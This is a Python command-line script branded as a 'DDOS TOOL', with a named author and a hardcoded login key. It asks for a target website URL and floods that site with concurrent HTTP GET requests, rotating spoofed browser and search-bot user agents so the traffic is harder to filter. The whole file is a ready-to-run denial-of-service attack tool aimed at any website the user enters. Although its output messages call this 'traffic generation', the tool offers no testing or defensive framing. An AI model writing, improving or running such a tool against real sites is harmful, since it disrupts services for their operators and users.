#!/usr/bin/env python3

import requests
import random
import time
import sys
import os
import concurrent.futures
from urllib.parse import urlparse
from colorama import init, Fore, Back, Style
import threading

# Initialize colorama
init(autoreset=True)

# Clear screen function (cross-platform)
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Banner with colors
def print_banner():
    banner = f'''
    {Fore.CYAN}╔════════════════════════════════════════════╗{Style.RESET_ALL}
    {Fore.CYAN}║{Style.RESET_ALL}{Fore.WHITE}{Back.BLUE}                                            {Style.RESET_ALL}{Fore.CYAN}║{Style.RESET_ALL}
    {Fore.CYAN}║{Style.RESET_ALL}{Fore.WHITE}{Back.BLUE}                  DDOS TOOL                 {Style.RESET_ALL}{Fore.CYAN}║{Style.RESET_ALL}
    {Fore.CYAN}║{Style.RESET_ALL}{Fore.WHITE}{Back.BLUE}                                            {Style.RESET_ALL}{Fore.CYAN}║{Style.RESET_ALL}
    {Fore.CYAN}║{Style.RESET_ALL}{Fore.WHITE}{Back.BLUE}                 ALLAHU AKBAR               {Style.RESET_ALL}{Fore.CYAN}║{Style.RESET_ALL}
    {Fore.CYAN}║{Style.RESET_ALL}{Fore.WHITE}{Back.BLUE}                                            {Style.RESET_ALL}{Fore.CYAN}║{Style.RESET_ALL}
    {Fore.CYAN}╚════════════════════════════════════════════╝{Style.RESET_ALL}
    '''
    print(banner)
    print(f"{Fore.YELLOW}✦ {Fore.WHITE}Advanced DDOS TOOL {Fore.YELLOW}✦{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}✦ {Fore.WHITE}Version 2.0 - Author: MD.SABBIR SHEIKH {Fore.YELLOW}✦{Style.RESET_ALL}")
    print()

# Print section header
def print_section(title):
    width = 50
    print(f"\n{Fore.CYAN}{'=' * width}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}={Style.RESET_ALL} {Fore.YELLOW}{title}{Style.RESET_ALL}".ljust(width + 10) + f"{Fore.CYAN}={Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * width}{Style.RESET_ALL}\n")

# Print status message
def print_status(message, status_type="info"):
    prefix = ""
    if status_type == "info":
        prefix = f"{Fore.BLUE}[INFO]{Style.RESET_ALL}"
    elif status_type == "success":
        prefix = f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL}"
    elif status_type == "error":
        prefix = f"{Fore.RED}[ERROR]{Style.RESET_ALL}"
    elif status_type == "warning":
        prefix = f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL}"
    print(f"{prefix} {message}")

# Progress bar class
class ProgressBar:
    def __init__(self, total, prefix='', suffix='', decimals=1, length=50, fill='█', print_end="\r"):
        self.total = total
        self.prefix = prefix
        self.suffix = suffix
        self.decimals = decimals
        self.length = length
        self.fill = fill
        self.print_end = print_end
        self.iteration = 0
        self._lock = threading.Lock()
        self.print_progress()
    
    def update(self):
        with self._lock:
            self.iteration += 1
            self.print_progress()
    
    def print_progress(self):
        percent = ("{0:." + str(self.decimals) + "f}").format(100 * (self.iteration / float(self.total)))
        filled_length = int(self.length * self.iteration // self.total)
        bar = f"{Fore.GREEN}{self.fill * filled_length}{Style.RESET_ALL}{'-' * (self.length - filled_length)}"
        sys.stdout.write(f'\r{self.prefix} |{bar}| {percent}% {self.suffix}')
        sys.stdout.flush()
        if self.iteration == self.total:
            print()

# List of user agents to simulate different browsers and devices
user_agents = [
    # Desktop browsers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.277",
    
    # Mobile browsers
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    
    # Tablets
    "Mozilla/5.0 (Linux; Android 11; SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1",
    
    # Bots (for variety)
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
]

# Function to validate URL
def validate_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

# Function to send a single request
def send_request(url, user_agent, request_number, total_requests, progress_bar=None):
    headers = {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=5)
        status = response.status_code
        
        # Color the status code based on its value
        if 200 <= status < 300:
            status_colored = f"{Fore.GREEN}{status}{Style.RESET_ALL}"
        elif 300 <= status < 400:
            status_colored = f"{Fore.BLUE}{status}{Style.RESET_ALL}"
        elif 400 <= status < 500:
            status_colored = f"{Fore.YELLOW}{status}{Style.RESET_ALL}"
        else:
            status_colored = f"{Fore.RED}{status}{Style.RESET_ALL}"
            
        # Update progress bar if provided
        if progress_bar:
            progress_bar.update()
        
        # Print detailed request info
        browser_type = user_agent.split('/')[0]
        print(f"  {Fore.CYAN}[{request_number}/{total_requests}]{Style.RESET_ALL} Status: {status_colored} using {Fore.MAGENTA}{browser_type}{Style.RESET_ALL}")
        return True
    except requests.exceptions.RequestException as e:
        if progress_bar:
            progress_bar.update()
        print(f"  {Fore.RED}[{request_number}/{total_requests}] Error: {str(e)}{Style.RESET_ALL}")
        return False

# Function to authenticate user
def authenticate():
    print_section("AUTHENTICATION")
    max_attempts = 3
    attempts = 0
    
    print(f"{Fore.YELLOW}Please authenticate to continue{Style.RESET_ALL}")
    print(f"You have {Fore.CYAN}{max_attempts}{Style.RESET_ALL} attempts to enter the correct key.\n")
    
    while attempts < max_attempts:
        key = input(f"{Fore.CYAN}Enter login key: {Style.RESET_ALL}")
        if key == "Sabbir":
            print_status("Authentication successful!", "success")
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            if remaining > 0:
                print_status(f"Invalid key! {remaining} attempts remaining.", "warning")
            else:
                print_status("Authentication failed! Maximum attempts reached.", "error")
    return False

# Function to get target configuration
def get_target_config():
    print_section("TARGET CONFIGURATION")
    
    # Get target URL from user
    while True:
        target_url = input(f"{Fore.CYAN}Enter the target website URL {Fore.YELLOW}{Fore.CYAN}: {Style.RESET_ALL}")
        
        # Validate URL
        if validate_url(target_url):
            print_status(f"Target URL set to: {Fore.GREEN}{target_url}{Style.RESET_ALL}", "success")
            break
        else:
            print_status("Invalid URL format. Please include http:// or https:// in your URL.", "error")
    
    # Get number of requests
    while True:
        try:
            num_requests = int(input(f"{Fore.CYAN}Enter the number of requests to send: {Style.RESET_ALL}"))
            if num_requests <= 0:
                raise ValueError
            print_status(f"Will send {Fore.GREEN}{num_requests}{Style.RESET_ALL} requests", "success")
            break
        except ValueError:
            print_status("Please enter a valid positive number.", "error")
    
    # Get concurrency level
    while True:
        try:
            concurrency = int(input(f"{Fore.CYAN}Enter the number of concurrent requests {Fore.YELLOW}(1-20, recommended 5){Fore.CYAN}: {Style.RESET_ALL}"))
            if concurrency <= 0 or concurrency > 20:
                print_status("Value out of range. Using default concurrency of 5.", "warning")
                concurrency = 5
            print_status(f"Concurrency level set to: {Fore.GREEN}{concurrency}{Style.RESET_ALL}", "success")
            break
        except ValueError:
            print_status("Invalid input. Using default concurrency of 5.", "warning")
            concurrency = 5
            break
    
    return target_url, num_requests, concurrency

# Function to display summary
def display_summary(target_url, num_requests, concurrency, successful_requests, elapsed_time):
    print_section("SUMMARY")
    
    success_rate = (successful_requests / num_requests) * 100 if num_requests > 0 else 0
    success_color = Fore.GREEN if success_rate > 80 else (Fore.YELLOW if success_rate > 50 else Fore.RED)
    
    print(f"{Fore.CYAN}Target URL:{Style.RESET_ALL} {target_url}")
    print(f"{Fore.CYAN}Total Requests:{Style.RESET_ALL} {num_requests}")
    print(f"{Fore.CYAN}Concurrent Connections:{Style.RESET_ALL} {concurrency}")
    print(f"{Fore.CYAN}Successful Requests:{Style.RESET_ALL} {Fore.GREEN}{successful_requests}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Failed Requests:{Style.RESET_ALL} {Fore.RED}{num_requests - successful_requests}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Success Rate:{Style.RESET_ALL} {success_color}{success_rate:.2f}%{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Total Time:{Style.RESET_ALL} {elapsed_time:.2f} seconds")
    
    if success_rate > 80:
        print(f"\n{Fore.GREEN}✓ Traffic generation completed successfully!{Style.RESET_ALL}")
    elif success_rate > 50:
        print(f"\n{Fore.YELLOW}⚠ Traffic generation completed with some failures.{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.RED}✗ Traffic generation completed with significant failures.{Style.RESET_ALL}")

# Main function
def main():
    # Clear screen and show banner
    clear_screen()
    print_banner()
    
    # Authenticate user
    if not authenticate():
        print_status("Access denied. Exiting program.", "error")
        sys.exit(1)
    
    # Get target configuration
    target_url, num_requests, concurrency = get_target_config()
    
    # Traffic generation section
    print_section("TRAFFIC GENERATION")
    print_status(f"Starting traffic generation to {Fore.GREEN}{target_url}{Style.RESET_ALL}", "info")
    print_status(f"Sending {Fore.YELLOW}{num_requests}{Style.RESET_ALL} requests with {Fore.YELLOW}{concurrency}{Style.RESET_ALL} concurrent connections", "info")
    print_status("Press Ctrl+C to stop at any time", "info")
    print()
    
    # Initialize progress bar
    progress_bar = ProgressBar(num_requests, prefix=f'{Fore.BLUE}Progress:{Style.RESET_ALL}', suffix='Complete', length=40)
    
    # Counter for successful requests
    successful_requests = 0
    start_time = time.time()
    
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = []
            for i in range(1, num_requests + 1):
                # Select a random user agent
                user_agent = random.choice(user_agents)
                
                # Submit the request to the thread pool
                future = executor.submit(send_request, target_url, user_agent, i, num_requests, progress_bar)
                futures.append(future)
                
                # Small delay to prevent overwhelming the target server
                time.sleep(0.1)
            
            # Wait for all futures to complete and count successful requests
            for future in concurrent.futures.as_completed(futures):
                if future.result():
                    successful_requests += 1
    
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Traffic generation stopped by user.{Style.RESET_ALL}")
    
    # Calculate elapsed time
    elapsed_time = time.time() - start_time
    
    # Display summary
    display_summary(target_url, num_requests, concurrency, successful_requests, elapsed_time)

if __name__ == "__main__":
    main()
